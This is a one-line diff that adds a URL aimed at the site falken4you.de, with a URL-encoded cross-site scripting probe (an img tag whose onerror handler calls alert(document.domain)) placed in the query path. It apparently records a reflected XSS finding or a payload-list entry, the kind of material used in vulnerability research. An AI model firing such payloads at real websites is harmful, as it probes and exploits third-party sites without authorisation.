@@ -1,0 +1,1 @@
+http://falken4you.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
